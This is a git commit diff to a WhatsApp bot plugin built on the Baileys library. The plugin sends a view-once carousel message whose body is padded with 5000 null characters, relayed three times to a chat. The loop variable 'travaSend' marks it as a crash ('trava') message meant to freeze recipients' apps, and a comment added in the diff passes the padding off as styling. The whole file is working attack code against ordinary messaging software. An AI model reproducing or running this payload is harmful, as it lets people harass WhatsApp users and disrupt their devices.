77256c86999ba9bde23e2496228231dbf911e80d
Tobiprueba <virtualvirtuales538@gmail.com>
2025-07-17 23:36:04 -0600

    Add files via upload

--- plugins/tools-caruseldos.js
+++ plugins/tools-caruseldos.js
@@ -1,13 +1,15 @@
-import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
+import { prepareWAMessageMedia, generateMessageID } from '@whiskeysockets/baileys';
 
-let handler = async (m, { conn, args }) => {
+let handler = async (m, { conn }) => {
   const target = m.chat;
   const imagePath = './src/foto.jpg';
-  const groupLink = "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE";
-  const travaSend = 3; // Puedes cambiar cuántas veces enviar
+  const groupLink = 'https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE';
+  const travaSend = 3; // Cuántas veces repetir el envío
 
+  // Subir imagen y preparar contenido multimedia
   const media = await prepareWAMessageMedia({ image: { url: imagePath } }, { upload: conn.waUploadToServer });
 
+  // Función para generar tarjetas
   const makeCard = () => ({
     header: {
       ...media.imageMessage,
@@ -31,21 +33,24 @@ let handler = async (m, { conn, args }) => {
     }
   });
 
+  // Generar las 10 tarjetas
   const cards = Array.from({ length: 10 }, makeCard);
 
+  // Crear mensaje tipo carrusel visual
   const msg = {
     viewOnceMessage: {
       message: {
         interactiveMessage: {
-          body: { text: "🎠 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛\n\n" + "\0".repeat(5000) },
-          carouselMessage: {
-            cards
-          }
+          body: {
+            text: "🎠 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛\n\n" + "\0".repeat(5000) // Cuerpo relleno para estilo
+          },
+          carouselMessage: { cards }
         }
       }
     }
   };
 
+  // Enviar carrusel N veces (travaSend)
   for (let i = 0; i < travaSend; i++) {
     await conn.relayMessage(target, msg, { messageId: generateMessageID() });
   }
